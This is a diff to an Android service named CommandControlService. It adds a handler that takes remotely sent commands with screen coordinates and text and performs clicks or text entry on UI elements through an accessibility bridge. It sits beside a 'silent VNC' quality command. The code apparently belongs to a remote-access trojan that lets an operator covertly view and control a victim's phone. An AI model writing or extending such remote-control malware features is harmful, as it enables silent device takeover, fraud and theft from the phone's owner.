@@ -1377,6 +1377,27 @@ public class CommandControlService extends Service {
                     sendResponse("OK", "Hierarquia solicitada");
                     break;
 
+                case "PERFORM_NODE_ACTION":
+                    try {
+                        if (UiAssistBridge.instance != null) {
+                            String nodeAction = cmd.has("action") ? cmd.get("action").getAsString() : "CLICK";
+                            int    bx         = cmd.has("bx")     ? cmd.get("bx").getAsInt()        : 0;
+                            int    by         = cmd.has("by")     ? cmd.get("by").getAsInt()        : 0;
+                            int    bw         = cmd.has("bw")     ? cmd.get("bw").getAsInt()        : 1;
+                            int    bh         = cmd.has("bh")     ? cmd.get("bh").getAsInt()        : 1;
+                            String nodeText   = cmd.has("text")   ? cmd.get("text").getAsString()   : "";
+                            UiAssistBridge.instance.performNodeAction(nodeAction, bx, by, bw, bh, nodeText);
+                            sendResponse("OK", "Node action: " + nodeAction + " @ [" + bx + "," + by + " " + bw + "x" + bh + "]");
+                            Log.d(TAG, "🎯 PERFORM_NODE_ACTION: " + nodeAction + " bounds=[" + bx + "," + by + "," + bw + "," + bh + "]");
+                        } else {
+                            sendResponse("ERROR", "UiAssistBridge unavailable");
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "PERFORM_NODE_ACTION error: " + e.getMessage(), e);
+                        sendResponse("ERROR", "Node action failed: " + e.getMessage());
+                    }
+                    break;
+
                 case "SET_SILENT_VNC_QUALITY":
                     try {
                         int silentQ = cmd.get("quality").getAsInt();
